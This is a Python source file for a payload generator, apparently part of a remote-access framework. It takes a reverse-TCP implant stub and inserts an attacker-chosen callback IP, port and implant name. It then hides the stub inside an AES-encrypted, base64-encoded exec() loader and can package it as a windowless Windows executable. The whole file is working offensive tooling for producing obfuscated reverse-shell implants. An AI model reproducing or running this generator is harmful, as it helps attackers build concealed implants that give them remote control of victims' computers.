import base64
import string
import random
import os
import tempfile
import shutil
import time

from Crypto.Cipher import AES
from core.color import color
from core.utils import tools


class PayloadGenerator:
    def __init__(self):
        self.callback_ip = '127.0.0.1'
        self.callback_port = 9876
        self.debug = True
        self.implantName = '0x' + 'EP01'

    @staticmethod
    def getTempPath():
        return tempfile.gettempdir() + "\\"

    @staticmethod
    def getRandomNumber(start, end):
        return random.randint(int(start), int(end))

    @staticmethod
    def getStartupPath(filename):
        return os.path.dirname(os.path.abspath(filename)) + r"\\"

    @staticmethod
    def readFile(fname):
        try:
            f = open(fname, "r")
            return f.read()
        except:
            return False

    @staticmethod
    def writeFile(fname, body):
        try:
            f = open(fname, "w")
            f.write(body)
            f.close()
            return True
        except Exception as e:
            print color.ReturnError("PayloadGen.WriteFile -> " + str(e))
            return False

    @staticmethod
    def doPrintHelp():
        help = '''Usage: payloadgen [host] [port] [debug] [implantName] [output] [console]

    Options:
        [host]          Specify the callback IP to use.
        [port]          Specify the callback PORT to use.
        [debug]         Will print debug messages (test only).
        [implantName]   Identity of the implant.
        [output]        Define .exe (pyinstaller required - Windows only) or .py
        [console]       Print the final payload source on the console
        
    Example:
        payloadgen 127.0.0.1 9876 True Home stub.py True
        '''
        return help

    @staticmethod
    def randomString(stringLength=16):
        lettersAndDigits = string.ascii_letters + string.digits
        return ''.join(random.choice(lettersAndDigits) for i in range(stringLength))

    @staticmethod
    def getFileNameWithoutExtension(fname):
        filename_w_ext = os.path.basename(fname)
        filename = os.path.splitext(filename_w_ext)[0]
        return filename

    @staticmethod
    def getFileSize(fname):
        return tools.sizeof_fmt(os.path.getsize(fname))

    @staticmethod
    def AES_payload(code):
        key = PayloadGenerator.randomString()
        iv = PayloadGenerator.randomString()

        obj = AES.new(key.encode(), AES.MODE_CFB, iv.encode())
        message = code.encode()
        outputencrypted = obj.encrypt(message)
        base64encrypted = base64.b64encode(outputencrypted)

        payload = '''
from Crypto.Cipher import AES
import base64, random

base64encrypted="%s"
iv="%s"
key="%s"

obj = AES.new(key.encode(), AES.MODE_CFB, iv.encode())
base64decrypted = base64.b64decode(base64encrypted) 
outputdecryptedfrombase64  = obj.decrypt(base64decrypted) 
exec(outputdecryptedfrombase64.decode("utf-8"))
        ''' % (base64encrypted, iv, key)

        return payload

    @staticmethod
    def Generate(string_):
        if len(string_.split(' ')) != 7:
            print color.ReturnError("Error: Arguments don't match path.")
            print(PayloadGenerator.doPrintHelp())
        else:
            try:
                sanitized = string_.split(' ')
                file_extension = os.path.splitext(sanitized[5])[1]
                if file_extension == ".exe":
                    if os.name == "nt":
                        while True:
                            if os.path.exists(r"C:\Python27\Scripts\pyinstaller.exe"):
                                print color.ReturnSuccess(
                                    "Pyinstaller validated => C:\Python27\Scripts\pyinstaller.exe")
                                break
                            else:
                                print color.ReturnError("Pyinstaller not found!")
                                print color.ReturnError(
                                    "Can't proceed with .exe standalone builder without Pyinstaller.\n")

                                if tools.Confirm('Do you want to install "Pyinstaller" now via "pip" command?'):
                                    os.system("c:\Python27\Scripts\pip.exe install pyinstaller")
                                else:
                                    return None
                    else:
                        print color.ReturnError("Can't build .exe binary from Linux platform.")
                        return

                print color.ReturnInfo("Input validated, generating payload ...")
                if os.name == "nt":
                    stubname = PayloadGenerator.getTempPath() + str(
                        PayloadGenerator.getRandomNumber(80000, 90000)) + ".py"
                else:
                    stubname = os.path.dirname(os.path.abspath(__file__)) + "/" + str(
                        PayloadGenerator.getRandomNumber(80000, 90000)) + ".py"

                stubpath = os.path.abspath(
                    os.path.join(os.path.abspath(os.path.join(PayloadGenerator.getStartupPath(__file__), os.pardir)),
                                 os.pardir)) + "/payloads/reverse_tcp.py"
                try:
                    shutil.copyfile(stubpath, stubname)
                except Exception, e:
                    print str(e)
                payload_body = PayloadGenerator.readFile(stubname)

                payload_body = payload_body.replace("self.host = '127.0.0.1'", "self.host = '%s'" % str(sanitized[1]))
                payload_body = payload_body.replace("self.port = 9876", "self.port = %s" % str(sanitized[2]))
                payload_body = payload_body.replace("self.debug = True", "self.debug = %s" % str(sanitized[3]))
                payload_body = payload_body.replace("self.implantName = '0x' + 'EP01'",
                                                    "self.implantName = '0x' + '%s'" % str(sanitized[4]))
                payload_body = PayloadGenerator.AES_payload(payload_body)

                PayloadGenerator.writeFile(stubname, payload_body)

                if file_extension == ".exe":
                    if os.name == "nt":
                        outputfile = sanitized[5]
                        if not ".exe" in outputfile:
                            outputfile += ".exe"

                        os.system("c:\Python27\Scripts\pyinstaller.exe --onefile --noconsole --windowed %s" % stubname)
                        time.sleep(5)
                        if os.path.exists(
                                "C:\Python27\Scripts\dist\%s.exe" % PayloadGenerator.getFileNameWithoutExtension(
                                        stubname)):
                            shutil.copyfile(
                                "C:\Python27\Scripts\dist\%s.exe" % PayloadGenerator.getFileNameWithoutExtension(
                                    stubname),
                                outputfile)
                        elif os.path.exists(
                                "C:\Python27\dist\%s.exe" % PayloadGenerator.getFileNameWithoutExtension(stubname)):
                            shutil.copyfile(
                                "C:\Python27\dist\%s.exe" % PayloadGenerator.getFileNameWithoutExtension(stubname),
                                outputfile)
                        else:
                            print color.ReturnError("Can't move file to location, maybe pyinstaller didn't move it yet.")

                        try:
                            os.remove(stubname)
                        except Exception as e:
                            print color.ReturnError("Error removing stub file: %s" % str(e))
                        print color.ReturnInfo("Final output size => %s" % PayloadGenerator.getFileSize(outputfile))
                        print color.ReturnSuccess("DONE => %s" % outputfile)
                    else:
                        print color.ReturnError("Can't build .exe binary from Linux platform.")
                        return
                else:
                    shutil.copyfile(stubname, sanitized[5])
                    try:
                        os.remove(stubname)
                    except Exception as e:
                        print color.ReturnError("Error: %s" % str(e))
                    time.sleep(1)

                    if sanitized[6] == 'True':
                        print '\nPayload: \n' + payload_body + '\n'

                    print color.ReturnSuccess("Final payload size => %s" % PayloadGenerator.getFileSize(sanitized[5]))
                    print color.ReturnSuccess(("DONE => %s\n" % sanitized[5]))

            except Exception as e:
                print color.ReturnError("Error: %s" % str(e))
